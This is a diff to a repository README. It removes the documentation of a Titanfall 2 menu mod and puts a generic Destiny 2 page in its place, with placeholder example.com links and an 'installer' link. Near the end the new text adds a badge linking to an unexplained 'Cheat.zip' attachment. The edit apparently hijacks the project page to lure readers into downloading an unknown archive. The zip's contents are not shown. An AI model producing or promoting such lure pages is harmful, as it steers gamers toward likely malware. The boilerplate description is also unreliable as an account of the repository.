@@ -1,120 +1,70 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Destiny-2
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the Destiny 2 repository! Explore the vast universe of Destiny 2 through exciting content, guides, and resources provided here.
 
+![Destiny 2 Banner](https://example.com/destiny2-banner.png)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Table of Contents
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+
+## Introduction
+
+Destiny 2 is a popular online multiplayer first-person shooter game developed by Bungie. The game is set in a mythic science fiction world where players can explore various planets, engage in cooperative and competitive activities, and uncover the mysteries of the universe.
+
+## Features
+
+- **Wide Range of Activities**: Engage in various activities such as Strikes, Raids, Gambit, Crucible, and more.
+  
+- **Customizable Guardian**: Customize your Guardian with a variety of weapons, armor, and abilities.
+  
+- **Explore Diverse Worlds**: Visit different planets and locations within the Destiny universe, each with its own unique challenges and rewards.
+  
+- **Social Gameplay**: Team up with friends or join a clan to tackle challenges together.
+  
+- **Regular Updates**: Enjoy frequent updates and expansions that bring new content and adventures to the game.
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To install Destiny 2, follow these steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. [Download the Destiny 2 Installer](https://example.com/destiny2-installer.exe)
+2. Run the installer and follow the on-screen instructions
+3. Launch the game and begin your adventure in the Destiny universe
 
-## Icepick
+## Usage
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+Here are some tips to enhance your Destiny 2 experience:
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+- **Join a Clan**: Participate in clan activities and earn rewards together.
+  
+- **Complete Milestones**: Daily and weekly milestones offer powerful rewards for completion.
+  
+- **Explore Every Destination**: Uncover hidden secrets and treasures across the various destinations.
+  
+- **Upgrade Your Gear**: Improve your weapons and armor to increase your power level and effectiveness in combat.
+  
+- **Engage in Endgame Activities**: Challenge yourself with Raids, Nightfall Strikes, and other endgame content.
 
-3) Launch Icepick.
+For more detailed guidance, check out the [Destiny 2 Wiki](https://example.com/destiny2-wiki) for comprehensive information on gameplay, items, and strategies.
 
-## Northstar
+## Contributing
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+Contributions to Destiny 2 are welcome! If you have suggestions, bug reports, or new features to propose, feel free to submit a pull request. Together, we can make Destiny 2 even better for all Guardians.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+## License
 
-3) Launch Northstar.
+The Destiny 2 repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). See the [LICENSE](LICENSE) file for more details.
 
-## Screenshots
+[![Download Cheat.zip](https://img.shields.io/badge/Download-Cheat.zip-ff69b4)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+Join the fight, Guardian. The galaxy awaits your light.
 
-Main Menu with the original Titanfall 2 menu video
+🚀 Happy gaming! 🌌
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
-
-Main Menu with the showcase removed to declutter the menu
-
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
-
-New Cheat options that can be enabled as well as the extras menu
-
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
-
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+![Destiny 2 Logo](https://example.com/destiny2-logo.png)
